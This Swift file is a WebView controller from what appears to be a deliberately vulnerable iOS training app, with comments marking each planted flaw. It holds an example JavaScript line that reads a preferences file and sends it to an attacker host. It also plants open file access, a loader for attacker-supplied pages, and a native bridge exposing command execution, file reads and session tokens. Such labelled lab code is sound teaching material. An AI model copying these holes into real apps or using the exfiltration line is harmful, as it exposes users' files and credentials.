import UIKit
import WebKit

/**
 * VULN: wkwebview-allowing-read-access-to (blog: wkwebview-allowing-read-access-to.md)
 *
 *   loadFileURL(_:allowingReadAccessTo:) is called with allowingReadAccessTo
 *   set to the entire app container (NSHomeDirectory). Any JavaScript in the
 *   loaded page can fetch() any file inside the container:
 *
 *     fetch('file:///var/mobile/Containers/Data/Application/<uuid>/Library/Preferences/<bundle>.plist')
 *       .then(r => r.text()).then(t => fetch('https://attacker.com/?d=' + btoa(t)))
 *
 * VULN: wkwebview-js-bridge-rce (blog: wkwebview-js-bridge-rce.md)
 *
 *   WKScriptMessageHandler "nativeBridge" exposes exec(), readFile(), and
 *   getToken() to any JavaScript running in the WebView. An attacker who can
 *   load controlled HTML into this WebView (via the url deep link or via
 *   an XSS in the loaded page) has full native code execution.
 *
 * VULN: ios-class-dump-endpoint-leak (blog: ios-class-dump-endpoint-leak.md)
 *
 *   API endpoints are hardcoded in the source as string literals, making them
 *   trivially discoverable via `strings` on the binary or class-dump.
 */
class WebViewController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {

    // VULN: ios-class-dump-endpoint-leak — hardcoded endpoints in binary strings
    private let kApiBase    = "https://api.vulnlabapp.example.com/v1"
    private let kAdminBase  = "https://admin.vulnlabapp.example.com"
    private let kInternalApi = "http://internal.corp.vulnlabapp.com:8080/api"

    private var webView: WKWebView!
    var pendingURL: String?

    override func viewDidLoad() {
        super.viewDidLoad()

        let config = WKWebViewConfiguration()
        let contentController = WKUserContentController()

        // VULN: wkwebview-js-bridge-rce — message handler callable from any JS
        contentController.add(self, name: "nativeBridge")
        config.userContentController = contentController


        webView = WKWebView(frame: view.bounds, configuration: config)
        webView.navigationDelegate = self
        view.addSubview(webView)

        if let urlString = pendingURL {
            loadURL(urlString)
            return
        }

        // VULN: wkwebview-allowing-read-access-to
        // allowingReadAccessTo grants JS access to the ENTIRE app container
        let htmlPath = Bundle.main.url(forResource: "index", withExtension: "html",
                                       subdirectory: "www")
                    ?? URL(fileURLWithPath: NSTemporaryDirectory() + "index.html")

        // VULN: NSHomeDirectory() as read scope — entire container readable from JS
        let containerURL = URL(fileURLWithPath: NSHomeDirectory()).resolvingSymlinksInPath()
        webView.loadFileURL(htmlPath, allowingReadAccessTo: containerURL)
    }

    // Handle URL from deep link parameter (vulnlab://webview?url=...)
    func loadURL(_ urlString: String) {
        guard let url = URL(string: urlString) else { return }
        // VULN: fetches attacker-controlled HTML and loads it via loadFileURL with NSHomeDirectory() scope
        // JS in the downloaded page can fetch() any file inside the container
        URLSession.shared.dataTask(with: url) { data, _, _ in
            guard let data = data else { return }
            // VULN: saves attacker HTML into Library/Preferences/ — same directory as target plist files
            // JS fetch('./com.vulnlab.iosapp.plist') is same-origin and succeeds within the broad allowingReadAccessTo scope
            let prefsDir = URL(fileURLWithPath: NSHomeDirectory())
                .appendingPathComponent("Library/Preferences", isDirectory: true)
                .resolvingSymlinksInPath()
            let tmp = prefsDir.appendingPathComponent("remote.html")
            try? data.write(to: tmp)
            DispatchQueue.main.async {
                let containerURL = URL(fileURLWithPath: NSHomeDirectory()).resolvingSymlinksInPath()
                self.webView.loadFileURL(tmp, allowingReadAccessTo: containerURL)
            }
        }.resume()
    }

    // VULN: wkwebview-js-bridge-rce — JS can call window.webkit.messageHandlers.nativeBridge.postMessage(...)
    func userContentController(_ userContentController: WKUserContentController,
                                didReceive message: WKScriptMessage) {
        guard let body = message.body as? [String: String] else { return }
        let action = body["action"] ?? ""
        let arg    = body["arg"]    ?? ""

        print("[wk-bridge] action=\(action) arg=\(arg)")

        switch action {

        case "exec":
            // VULN: arbitrary command execution from JavaScript
            let result = shellExec(arg)
            webView.evaluateJavaScript("window.nativeBridgeCallback('\(result.escaped())')", completionHandler: nil)

        case "readFile":
            // VULN: arbitrary file read from JavaScript — base64 to handle binary plists
            let content: String
            if let data = try? Data(contentsOf: URL(fileURLWithPath: arg)) {
                content = data.base64EncodedString()
            } else {
                content = "error: cannot read"
            }
            webView.evaluateJavaScript("window.nativeBridgeCallback('\(content.escaped())')", completionHandler: nil)

        case "getToken":
            // VULN: returns session token from UserDefaults to JavaScript
            let token = UserDefaults.standard.string(forKey: "session_token") ?? "none"
            print("[wk-bridge] getToken returning: \(token)")
            webView.evaluateJavaScript("window.nativeBridgeCallback('\(token)')", completionHandler: nil)

        default:
            break
        }
    }

    private func shellExec(_ cmd: String) -> String {
        // Process() is unavailable on iOS — demonstrating RCE intent only
        return "[exec: \(cmd)]"
    }
}

private extension String {
    func escaped() -> String {
        replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "'",  with: "\\'")
            .replacingOccurrences(of: "\n", with: "\\n")
    }
}
